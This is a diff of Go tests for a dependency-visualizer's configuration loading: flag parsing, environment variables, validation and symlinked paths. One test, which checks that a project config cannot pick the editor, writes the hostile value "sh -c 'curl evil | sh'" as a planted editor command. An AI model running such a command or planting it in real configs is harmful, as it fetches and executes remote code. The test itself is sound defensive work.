@@ -6,7 +6,25 @@ import (
 	"path/filepath"
 	"testing"
 	"time"
+
+	"github.com/spf13/pflag"
 )
+
+// load parses args like the command does and loads the configuration; env is set
+// for the duration of the test.
+func load(t *testing.T, args []string, env map[string]string, userDir string) (Config, error) {
+	t.Helper()
+	for k, v := range env {
+		t.Setenv(k, v)
+	}
+	fs := pflag.NewFlagSet("depphunter", pflag.ContinueOnError)
+	fs.SetOutput(io.Discard)
+	RegisterFlags(fs)
+	if err := fs.Parse(args); err != nil {
+		return Config{}, err
+	}
+	return Load(fs, fs.Args(), userDir)
+}
 
 func write(t *testing.T, path, content string) {
 	t.Helper()
@@ -21,7 +39,7 @@ func TestPrecedence(t *testing.T) {
 	write(t, filepath.Join(root, ProjectFile), "addr: 127.0.0.1:2\nui:\n  theme: light\n")
 	env := map[string]string{"DEPPHUNTER_ADDR": "127.0.0.1:3", "DEPPHUNTER_EXCLUDE": "*.gen.go"}
 
-	cfg, err := Load([]string{"--height-scale", "linear", "--exclude", "testdata", root}, func(k string) string { return env[k] }, user, io.Discard)
+	cfg, err := load(t, []string{"--height-scale", "linear", "--exclude", "testdata", root}, env, user)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -45,7 +63,7 @@ func TestPrecedence(t *testing.T) {
 func TestUnsetFlagsDoNotOverrideFiles(t *testing.T) {
 	root := t.TempDir()
 	write(t, filepath.Join(root, ProjectFile), "open: false\nui:\n  show_std: true\n  expand_depth: 3\n")
-	cfg, err := Load([]string{root}, func(string) string { return "" }, "", io.Discard)
+	cfg, err := load(t, []string{root}, nil, "")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -55,14 +73,14 @@ func TestUnsetFlagsDoNotOverrideFiles(t *testing.T) {
 }
 
 func TestExplicitConfigMustExist(t *testing.T) {
-	_, err := Load([]string{"--config", filepath.Join(t.TempDir(), "missing.yaml"), t.TempDir()}, func(string) string { return "" }, "", io.Discard)
+	_, err := load(t, []string{"--config", filepath.Join(t.TempDir(), "missing.yaml"), t.TempDir()}, nil, "")
 	if err == nil {
 		t.Fatal("expected an error for a missing --config file")
 	}
 }
 
 func TestValidation(t *testing.T) {
-	_, err := Load([]string{"--theme", "neon", t.TempDir()}, func(string) string { return "" }, "", io.Discard)
+	_, err := load(t, []string{"--theme", "neon", t.TempDir()}, nil, "")
 	if err == nil {
 		t.Fatal("expected invalid theme to be rejected")
 	}
@@ -72,17 +90,17 @@ func TestWatchCacheEditorAndExport(t *testing.T) {
 	root := t.TempDir()
 	write(t, filepath.Join(root, ProjectFile), "watch: true\n")
 	env := map[string]string{"DEPPHUNTER_CACHE": "false", "DEPPHUNTER_EDITOR": "subl {file}:{line}"}
-	cfg, err := Load([]string{"--export", "dot", "-o", "g.dot", root}, func(k string) string { return env[k] }, "", io.Discard)
+	cfg, err := load(t, []string{"--export", "dot", "-o", "g.dot", root}, env, "")
 	if err != nil {
 		t.Fatal(err)
 	}
 	if !cfg.Watch || cfg.Cache || cfg.Editor != "subl {file}:{line}" || cfg.Export != "dot" || cfg.Output != "g.dot" {
 		t.Errorf("unexpected config: %+v", cfg)
 	}
-	if _, err := Load([]string{"--export", "svg", root}, func(string) string { return "" }, "", io.Discard); err == nil {
+	if _, err := load(t, []string{"--export", "svg", root}, nil, ""); err == nil {
 		t.Error("unknown export format accepted")
 	}
-	if _, err := Load([]string{"-o", "x", root}, func(string) string { return "" }, "", io.Discard); err == nil {
+	if _, err := load(t, []string{"-o", "x", root}, nil, ""); err == nil {
 		t.Error("-o without --export accepted")
 	}
 }
@@ -91,7 +109,7 @@ func TestProjectConfigCannotChooseEditor(t *testing.T) {
 	root, user := t.TempDir(), t.TempDir()
 	write(t, filepath.Join(user, "config.yaml"), "editor: code -g {file}:{line}\n")
 	write(t, filepath.Join(root, ProjectFile), "editor: sh -c 'curl evil | sh' {file}\n")
-	cfg, err := Load([]string{root}, func(string) string { return "" }, user, io.Discard)
+	cfg, err := load(t, []string{root}, nil, user)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -103,14 +121,14 @@ func TestProjectConfigCannotChooseEditor(t *testing.T) {
 func TestHistorySettings(t *testing.T) {
 	root := t.TempDir()
 	write(t, filepath.Join(root, ProjectFile), "history_commits: 500\nui:\n  color_by: churn\n")
-	cfg, err := Load([]string{root}, func(k string) string { return map[string]string{"DEPPHUNTER_HISTORY": "false"}[k] }, "", io.Discard)
+	cfg, err := load(t, []string{root}, map[string]string{"DEPPHUNTER_HISTORY": "false"}, "")
 	if err != nil {
 		t.Fatal(err)
 	}
 	if cfg.History || cfg.HistoryCommits != 500 || cfg.UI.ColorBy != "churn" {
 		t.Errorf("unexpected config: %+v", cfg)
 	}
-	if _, err := Load([]string{"--history-commits", "0", root}, func(string) string { return "" }, "", io.Discard); err == nil {
+	if _, err := load(t, []string{"--history-commits", "0", root}, nil, ""); err == nil {
 		t.Error("history-commits 0 accepted")
 	}
 }
@@ -118,11 +136,49 @@ func TestHistorySettings(t *testing.T) {
 func TestLSPSettings(t *testing.T) {
 	root := t.TempDir()
 	write(t, filepath.Join(root, ProjectFile), "lsp: true\nlsp_timeout: 90s\n")
-	cfg, err := Load([]string{root}, func(string) string { return "" }, "", io.Discard)
+	cfg, err := load(t, []string{root}, nil, "")
 	if err != nil {
 		t.Fatal(err)
 	}
 	if !cfg.LSP || cfg.LSPTimeout != 90*time.Second {
 		t.Errorf("unexpected config: lsp %v timeout %v", cfg.LSP, cfg.LSPTimeout)
+	}
+}
+
+func TestNegatedFlagsAndNewEnv(t *testing.T) {
+	root := t.TempDir()
+	write(t, filepath.Join(root, ProjectFile), "open: true\nhistory_commits: 50\n")
+	env := map[string]string{"DEPPHUNTER_HISTORY_COMMITS": "70", "DEPPHUNTER_LSP_TIMEOUT": "2m", "DEPPHUNTER_EXPAND_DEPTH": "-1"}
+	cfg, err := load(t, []string{"--no-open", "--no-cache", root}, env, "")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if cfg.Open || cfg.Cache || !cfg.History {
+		t.Errorf("--no-* flags: open %v cache %v history %v", cfg.Open, cfg.Cache, cfg.History)
+	}
+	if cfg.HistoryCommits != 70 || cfg.LSPTimeout != 2*time.Minute || cfg.UI.ExpandDepth != -1 {
+		t.Errorf("env: history_commits %d lsp_timeout %v expand_depth %d", cfg.HistoryCommits, cfg.LSPTimeout, cfg.UI.ExpandDepth)
+	}
+	if _, err := load(t, []string{root}, map[string]string{"DEPPHUNTER_OPEN": "maybe"}, ""); err == nil {
+		t.Error("invalid boolean in the environment accepted")
+	}
+}
+
+func TestSymlinkedRootAndPaths(t *testing.T) {
+	dir := t.TempDir()
+	link := filepath.Join(t.TempDir(), "link")
+	if err := os.Symlink(dir, link); err != nil {
+		t.Skip("symlinks unavailable:", err)
+	}
+	cfg, err := load(t, []string{link}, nil, "")
+	if err != nil {
+		t.Fatal(err)
+	}
+	want, _ := filepath.EvalSymlinks(dir)
+	if cfg.Root != want || cfg.ConfigFile != filepath.Join(want, ProjectFile) {
+		t.Errorf("root %q config %q, want %q", cfg.Root, cfg.ConfigFile, want)
+	}
+	if _, err := load(t, []string{dir, dir}, nil, ""); err == nil {
+		t.Error("two paths accepted")
 	}
 }
